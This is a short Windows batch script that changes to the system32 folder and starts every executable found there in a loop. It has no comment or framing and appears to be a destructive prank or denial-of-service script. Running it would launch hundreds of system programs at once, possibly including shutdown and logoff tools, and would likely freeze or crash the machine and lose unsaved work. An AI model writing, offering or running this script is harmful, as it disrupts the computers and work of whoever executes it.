@echo off
cd %WINDIR%\system32

for %%f in (*.exe) do (
    start "%%~nxf" "%%f"
)